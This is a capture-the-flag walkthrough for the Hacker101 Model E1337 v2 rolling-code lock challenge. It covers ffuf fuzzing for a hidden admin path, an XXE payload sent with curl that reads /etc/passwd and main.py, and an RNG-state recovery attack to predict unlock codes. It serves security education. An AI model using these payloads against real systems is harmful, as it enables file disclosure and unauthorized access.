# Model E1337 v2 — Hardened Rolling Code Lock (Hacker101)

Two separate wins on this challenge:

1. **Flag in source (XXE / “flag0” style):** XML external entity via **`set-config`** → read **`main.py`** (flag often in a comment).
2. **Unlock flag (crypto):** Predict the **64-bit** rolling code from **`rng`** logic and POST it to **`/unlock`** (see [7Rocky — Model E1337 v2](https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/)).

> Replace **`HOST`** with your instance, e.g. `https://88e6b7e79a5d2bb31f542c6b62f35c07.ctf.hacker101.com`.

---

## Map the app (important for v2 on Hacker101)

On many deployments:

- **Public lock UI** lives at the **root**: `HOST/`, `HOST/unlock` (POST), and **`HOST/rng`** serves the Python RNG source.
- **Admin / config** routes are mounted under a **hidden prefix** (often **10 lowercase hex chars**), e.g. `HOST/a89232cf07/admin` — not at `HOST/admin`. That matches how older instances were fuzzed ([onealmond write-up](https://github.com/onealmond/hacking-lab/blob/master/hacker101-ctf/model-e1337-rolling-code-lock/writeup.md)) and how [7Rocky](https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/) references `http://IP/PREFIX/rng`.

**Discover `PREFIX`:** run a directory fuzzer on the first path segment until **`/{PREFIX}/admin`** returns **200** (and **`/{PREFIX}/get-config`** is not 404). Example with [ffuf](https://github.com/ffuf/ffuf):

```bash
BASE='https://YOUR_INSTANCE.ctf.hacker101.com'
# Fuzz the first path segment until /PREFIX/admin is not 404:
ffuf -u "$BASE/FUZZ/admin" -w wordlist.txt -mc 200,204,301,302,307 -fc 404
```

If you do not have a hex wordlist, generate candidates (length **8–10**, `0-9a-f`) or reuse a small “raft” list; the exact `PREFIX` is **per instance**.

Working URLs look like:

- `HOST/PREFIX/admin` — HTML comment often mentions **`get-config`**.
- `HOST/PREFIX/get-config` — XML “config” (location string).
- `HOST/PREFIX/set-config` — needs a query parameter carrying XML (see below).

---

## XXE → read `/etc/passwd` then `main.py`

[testert1ng’s flag0 notes](https://github.com/testert1ng/hacker101-ctf/tree/master/model_e1337-rolling_code_lock/flag0) use a **`param`** query string for an initial payload; other write-ups use **`data`** with `curl -G --data-urlencode`. Try **`data`** first (common on Flask), then **`param`** if the app rejects it.

**Payload (entity in `<location>`):**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<config><location>&xxe;</location></config>
```

**Send** (adjust `PREFIX` and encoding):

```bash
XML='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "/etc/passwd">]><config><location>&xxe;</location></config>'
curl -sS -G "HOST/PREFIX/set-config" --data-urlencode "data=$XML"
# follow redirect, then:
curl -sS "HOST/PREFIX/admin"
```

Then point the entity at the app source. **Try several SYSTEM identifiers** if one fails (working directory differs by image):

- `main.py`
- `/app/main.py`
- `file:///app/main.py`

```bash
XML='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "main.py">]><config><location>&xxe;</location></config>'
curl -sS -G "HOST/PREFIX/set-config" --data-urlencode "data=$XML"
curl -sS "HOST/PREFIX/admin"
```

The **first flag** is usually a **`^FLAG^…$FLAG$` comment** near the top of `main.py`.

---

## Unlock flag (64-bit RNG break)

The live **`/rng`** matches the **v2** generator (`xrange`, **64** output bits, inner loop **3×** state update). One observed “wrong code” line looks like:

`Code incorrect.  Expected <64-bit decimal>`

Use a GF(2) / matrix approach so that **one** such code is enough to recover state and predict the next valid unlock (same idea as [7Rocky — Model E1337 v2](https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/)). This repo includes a working script:

```bash
python3 solve_v2.py 'https://YOUR_INSTANCE.ctf.hacker101.com'
```

1. `POST /unlock` with any wrong numeric `code` (e.g. `0`) and read **`Expected <n>`** from the body (the server sleeps ~5s per try).
2. The script recovers a consistent internal state, advances it past the server’s `next(64)`, and **`POST`s the next code** — response should be `Unlocked successfully` plus the flag.

**Note:** Brute-forcing the code is not practical. If the host returns **503** HTML instead of plain text, the instance is down or asleep — start a **new Hacker101 session** and pass the new URL to `solve_v2.py`.

---

## Submitting flags

Hacker101 expects the full token **`^FLAG^<hex>$FLAG$`**. If any step returns a truncated suffix, append **`FLAG$`** as needed (same pattern as other Hacker101 challenges).

---

## References

- [testert1ng — Rolling Code Lock flag0 (XXE walkthrough)](https://github.com/testert1ng/hacker101-ctf/tree/master/model_e1337-rolling_code_lock/flag0)
- [7Rocky — Model E1337 v2 (crypto / unlock)](https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/)
- [onealmond — Model E1337 (prefix discovery + XXE)](https://github.com/onealmond/hacking-lab/blob/master/hacker101-ctf/model-e1337-rolling-code-lock/writeup.md)
- [7Rocky — Model E1337 (original, 26-bit + `/app/main.py`)](https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337---rolling-code-lock/)

---

## License

Challenge content is © HackerOne / Hacker101. These notes are for education only.
